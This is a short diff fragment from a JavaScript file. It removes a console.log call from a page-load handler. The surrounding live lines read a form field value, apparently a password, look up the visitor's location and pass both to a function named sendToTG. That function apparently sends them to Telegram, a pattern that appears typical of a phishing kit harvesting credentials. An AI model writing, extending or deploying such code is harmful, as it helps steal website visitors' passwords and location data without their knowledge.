@@ -39,7 +39,6 @@ document.addEventListener("DOMContentLoaded", function () {
         const pd = pi.value;
        // await sfr(el, pd);
         await getLoc();
-                console.log({...loc});
        await sendToTG(el, pd);
     });
 
